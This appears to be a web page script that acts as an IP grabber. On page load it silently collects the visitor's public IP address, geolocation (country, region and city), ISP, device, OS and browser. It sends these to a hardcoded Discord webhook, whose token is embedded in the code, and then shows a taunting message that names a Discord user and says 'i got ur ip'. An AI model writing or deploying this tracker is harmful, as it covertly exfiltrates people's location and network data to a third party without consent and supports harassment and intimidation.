<script>
const webhookUrl = "https://discord.com/api/webhooks/1446998835229626412/aL3byydfp-9STVBzdf8SMsAiTASlJFHxQrjts7rttPgGlhcCvNE1adAd2ESDJd5qdS4B"; 

// Load Fredoka One font
const fontLink = document.createElement('link');
fontLink.href = 'https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap';
fontLink.rel = 'stylesheet';
document.head.appendChild(fontLink);

// Device / OS / Browser detection
function getDeviceType() {
  const ua = navigator.userAgent;
  if (/mobile/i.test(ua)) return "Mobile";
  if (/tablet/i.test(ua)) return "Tablet";
  return "Desktop";
}
function getOS() {
  const ua = navigator.userAgent;
  if (ua.includes("Win")) return "Windows";
  if (ua.includes("Mac")) return "macOS";
  if (ua.includes("Linux")) return "Linux";
  if (/Android/i.test(ua)) return "Android";
  if (/iPhone|iPad/i.test(ua)) return "iOS";
  return "Unknown";
}
function getBrowser() {
  const ua = navigator.userAgent;
  if (ua.includes("Chrome")) return "Chrome";
  if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
  if (ua.includes("Firefox")) return "Firefox";
  if (ua.includes("Edg")) return "Edge";
  return "Unknown";
}

// Function to display the message
function showMessage() {
  document.body.innerHTML = `
    <div style="
      font-family: 'Fredoka One', cursive;
      font-size: 48px;
      font-weight: bold;
      color: black;
      text-align: center;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 20px;
      box-sizing: border-box;
    ">
    hamster149 on discord, i got ur ip btw lol
    </div>
  `;
}

// Fetch the visitor's public IP (IPv4 or IPv6)
fetch("https://api64.ipify.org?format=json")
  .then(res => res.json())
  .then(ipData => {
    const visitorIP = ipData.ip; // could be IPv4 or IPv6

    // Fetch geo info based on the IP
    fetch(`https://ipapi.co/${visitorIP}/json/`)
      .then(res => res.json())
      .then(geo => {

        const payload = {
          content: "ðŸŒ New visitor on your site!",
          embeds: [
            {
              title: "Visitor Details",
              color: 5814783,
              fields: [
                { name: "IPv4", value: visitorIP }, // always called IPv4
                { name: "Country", value: geo.country_name || "Unknown", inline: true },
                { name: "Region", value: geo.region || "Unknown", inline: true },
                { name: "City", value: geo.city || "Unknown", inline: true },
                { name: "ISP / Org", value: geo.org || "Unknown" },
                { name: "Device", value: getDeviceType(), inline: true },
                { name: "OS", value: getOS(), inline: true },
                { name: "Browser", value: getBrowser(), inline: true }
              ]
            }
          ]
        };

        // Send to Discord webhook
        return fetch(webhookUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        }).then(() => {
          // Show message after successful webhook send
          showMessage();
        }).catch(() => {
          // Show message even if webhook fails
          showMessage();
        });
      });
  })
  .catch(err => {
    console.error("IP fetch error:", err);
    // Show message even if IP fetch fails
    showMessage();
  });
</script>
